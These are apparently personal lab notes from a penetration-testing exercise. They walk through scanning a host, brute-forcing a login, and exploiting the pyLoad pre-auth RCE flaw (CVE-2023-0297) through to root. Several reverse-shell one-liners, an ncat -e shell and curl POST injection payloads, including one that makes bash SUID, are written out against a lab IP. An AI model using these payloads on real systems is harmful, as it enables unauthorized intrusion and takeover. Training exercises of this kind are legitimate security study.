Nov 10 2023

Target: 	
```ini
192.168.181.26
```
# Prep

## Open Resources

General Mind Map:
https://xmind.app/m/QsNUEz/

Confirm docker is installed and set rustscan as an alias or add to bashrc / fish config due to it being able to scan all ports and services in 10 seconds
```sh
alias rustscan='sudo docker run -it --rm --name rustscan rustscan/rustscan:2.1.1 -a'
```

Create directory for target and enter it
```sh
mkdir ClamAV
cd ClamAV
```

Prep a nc listener
```sh
nc -nlvp 4444
```

Confirm ip address
```sh
hostname -I
```
	192.168.45.241

# Recon
Start with a quick open port scan
```sh
rustscan 192.168.181.26
```
	22/tcp   open  ssh     syn-ack
	9666/tcp open  zoomcp  syn-ack

Quick OS check
```sh
sudo nmap -O --top-ports 1000 -v -T4 192.168.181.26 -oN osType.nmap
```
	No exact OS matches for host

Follow up with a service scan on those open ports
```sh
sudo nmap -sC -sV -p22,9666 -v -T5 192.168.181.26 -oN services.nmap
```
	PORT     STATE SERVICE VERSION
	22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 b9bc8f013f855df95cd9fbb615a01e74 (ECDSA)
	|_  256 53d97f3d228afd5798fe6b1a4cac7967 (ED25519)
	9666/tcp open  http    CherryPy wsgiserver
	| http-robots.txt: 1 disallowed entry 
	|_/
	| http-methods: 
	|_  Supported Methods: GET OPTIONS HEAD
	| http-title: Login - pyLoad 
	|_Requested resource was /login?next=http://192.168.181.26:9666/
	|_http-server-header: Cheroot/8.6.0
	|_http-favicon: Unknown favicon MD5: 71AAC1BA3CF57C009DA1994F94A2CC89
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
# Port 	22 - ssh
	PORT     STATE SERVICE VERSION
	22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 b9bc8f013f855df95cd9fbb615a01e74 (ECDSA)
	|_  256 53d97f3d228afd5798fe6b1a4cac7967 (ED25519)

Skip for now
# Port 9666 http
	9666/tcp open  http    CherryPy wsgiserver
		| http-robots.txt: 1 disallowed entry 
		|_/
		| http-methods: 
		|_  Supported Methods: GET OPTIONS HEAD
		| http-title: Login - pyLoad 
		|_Requested resource was /login?next=http://192.168.181.26:9666/
		|_http-server-header: Cheroot/8.6.0
		|_http-favicon: Unknown favicon MD5: 71AAC1BA3CF57C009DA1994F94A2CC89
		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```sh
nmap -sV --script "http-*" -p 9666 -T5 192.168.181.26 -oN http9666.nmap
```
	...long scan...

Kernel Exploits
```sh
searchsploit Cheroot 8.6.0
```
	Exploits: No Results
	Shellcodes: No Results



Target URL:
```
http://192.168.181.26:9666
```
![[Pasted image 20231110020916.png]]
Login page
	Source Code shows nothing

Check for non-navigable directories
```sh
dirbuster
```
- Run at `50` threads
- Word list location:
```
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
	Only the root directory was found. Low socket connection rate so easy to DOS

Default creds
	admin:admin
	admin:password
Nope

Hydra bruteforce in background with admin as a try
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.181.26 -s 9666 http-post-form "/admin/login.php:username=^USER^&password=^PASS^:Incorrect username/email or password."
```
	Hydra is good when it works...

Check service exploit
```sh
searchsploit pyload
```
	 Exploit Title                                              |  Path
	PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)         | python/webapps/51532.py
Potential RCE found

```sh
searchsploit -p 51532
```
	  Exploit: PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)
	      URL: https://www.exploit-db.com/exploits/51532
	     Path: /snap/searchsploit/387/opt/exploitdb/exploits/python/webapps/51532.py
	    Codes: CVE-2023-0297
	 Verified: True
	File Type: <missing file package>

```sh
cp /snap/searchsploit/387/opt/exploitdb/exploits/python/webapps/51532.py .
```

Check exploit
![[Pasted image 20231110022243.png]]
	Uses requests to send a exploit packet to the /flash/addcrypted2* endpoint

Confirmed this URL exists
![[Pasted image 20231110023042.png]]

Learn Exploit
```sh
python 51532.py -h
```
	usage: 51532.py [-h] -u URL -c CMD
	optional arguments:
	  -h, --help  show this help message and exit
	  -u URL      Target url.
	  -c CMD      Command to execute.

Run exploit 
```sh
python 51532.py -u http://192.168.181.26:9666 -c id
```

![[Pasted image 20231110023207.png]]
Confirm exploit worked since this seems like a blind confirmation

Retry with reverse shell. Python is fitting due to pyLoad
https://revshells.com
	My IP: 192.168.45.241

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.241",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

 Run it (remove trailing `/`
```sh
python 51532.py -u http://192.168.181.26:9666 -c "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.241",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"
```
	Nope
			Keep trying revshells until one takes
				sh -i >& /dev/tcp/192.168.45.241/4444 0>&1

```sh
python 51532.py -u http://192.168.181.26:9666 -c "sh -i >& /dev/tcp/192.168.45.241/4444 0>&1"
```
Need to remember to quote "the command"

ncat seems to be on target server
```sh
python 51532.py -u http://192.168.181.26:9666 -c "ncat 192.168.45.241 4444 -e sh"
```
![[Pasted image 20231110024708.png]]

curl method to deliver the payload from a russian fourm
```sh
curl -i -s -k -XPOST --data-binary 'jk=pyimport%20os;os.system("chmod%20u%2bs%20/bin/bash");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' 'http://192.168.181.26:9666/flash/addcrypted2'
```
	https://attackerkb.com/topics/4G0gkUrtoR/cve-2023-0297

Message shown if it is vulnerable 
![[Pasted image 20231110030519.png]]
	Could not decrypt key

Now try a reverse shell
```sh
curl -i -s -k -XPOST --data-binary 'jk=pyimport%20os;os.system("ncat%20192.168.45.241%204444%20-e%20bash");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' 'http://192.168.181.26:9666/flash/addcrypted2'
```
	Still closees upon connection


```sh
curl -i -s -k -XPOST --data-binary 'jk=pyimport%20os;os.system("ncat%20192.168.45.241%204444%20-e%20/bin/sh%20-c%20'echo%20WHOAMI:%20$(whoami)'");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' 'http://192.168.181.26:9666/flash/addcrypted2'
```
	Nope

Offsec says this curl connection test works...
```sh
curl 192.168.45.241:4444
```
	At least now it doesn't auto close and takes in one input but I do see the output

Recommended to use /bin/bash for revshells as it's more stable
```sh
ncat -e /bin/bash 192.168.45.241 4444
```

Will try with the exploit script

```sh
python 51532.py -u http://192.168.181.26:9666 -c "ncat -e /bin/bash 192.168.45.241 4444"
```
	We're in

Check Privileges 
```sh
whoami && id
```
	root
	uid=0(root) gid=0(root) groups=0(root)

Upgrade the shell for something more stable
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Actions On Objectives

For non-privileged access proof dump
```sh
echo " "; echo "local:"; find / -type f -name "local.txt" 2>/dev/null | xargs cat 2>/dev/null;
```

Dump all local, user, network, and proof info.
```sh
echo " "; echo "uname -a:"; uname -a; \
echo " "; echo "hostname:"; hostname; \
echo " "; echo "id"; id; \
echo " "; echo "ifconfig:"; /sbin/ifconfig -a; \
echo " "; echo "proof:"; cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null; echo " "
```
![[Pasted image 20231110032723.png]]
Submit hash(s)
`cf9ba6ea74a7f88b3b9d3ec9e7d9a254`